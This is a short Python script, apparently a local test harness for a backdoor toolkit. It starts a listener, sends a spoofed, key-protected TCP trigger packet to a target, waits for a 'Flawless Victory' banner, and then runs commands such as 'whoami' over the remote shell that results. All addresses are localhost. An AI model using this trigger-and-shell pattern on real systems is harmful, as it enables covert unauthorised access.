import subprocess

TARGET_ADDR = "127.0.0.1"
TARGET_PORT = "4444"
SPOOF_ADDR = "127.0.0.1"
SPOOF_PORT = "666"
LISTEN_ADDR = "127.0.0.1"
LISTEN_PORT = "4445"

def remote_shell():
    "Return subprocess object that "
    proc = subprocess.Popen(['./listener', '-p', '4445', '-s', 's3cr3t'],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)

    subprocess.Popen([
        './packet',
        '-t', TARGET_ADDR,
        '-r', TARGET_PORT,
        '-x', 'tcp',
        '-s', SPOOF_ADDR,
        '-q', SPOOF_PORT,
        '-l', LISTEN_ADDR,
        '-p', LISTEN_PORT,
        '-k', 'hax0r'
        ],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    while "Flawless Victory" not in proc.stdout.readline():
        pass
    proc.stdout.readline()

    return proc

def run_cmd(proc, cmd):
    proc.stdin.write(cmd + "\n")
    proc.stdin.flush()
    proc.stdout.readline() # This is the prompt
    result = ""
    line = None
    while True:
        line = proc.stdout.readline()
        if line == '\n':
            break
        result += line
    return result

def main():
    proc = remote_shell()
    print(run_cmd(proc, "whoami"))
    proc.stdin.close()
    proc.terminate()

if __name__ == "__main__":
    main()
